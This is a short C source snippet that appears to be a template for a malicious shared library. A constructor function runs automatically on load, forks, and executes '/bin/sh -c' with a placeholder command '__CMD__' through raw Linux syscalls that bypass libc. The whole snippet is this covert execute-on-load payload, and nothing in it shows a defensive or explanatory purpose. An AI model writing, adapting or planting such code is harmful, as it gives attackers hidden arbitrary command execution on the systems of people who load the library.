static long sc(long n, long a, long b, long c) {
    long r;
    __asm__ volatile("syscall" : "=a"(r) : "a"(n), "D"(a), "S"(b), "d"(c) : "rcx","r11","memory");
    return r;
}
static const char sh[]    = "/bin/sh";
static const char dashc[] = "-c";
static const char cmd[]   = "__CMD__";
__attribute__((constructor)) static void go(void) {
    long pid = sc(57, 0, 0, 0);                 /* fork */
    if (pid == 0) {
        const char *argv[4] = { sh, dashc, cmd, 0 };
        const char *envp[1] = { 0 };
        sc(59, (long)sh, (long)argv, (long)envp);   /* execve */
        sc(60, 7, 0, 0);                            /* exit */
    }
}
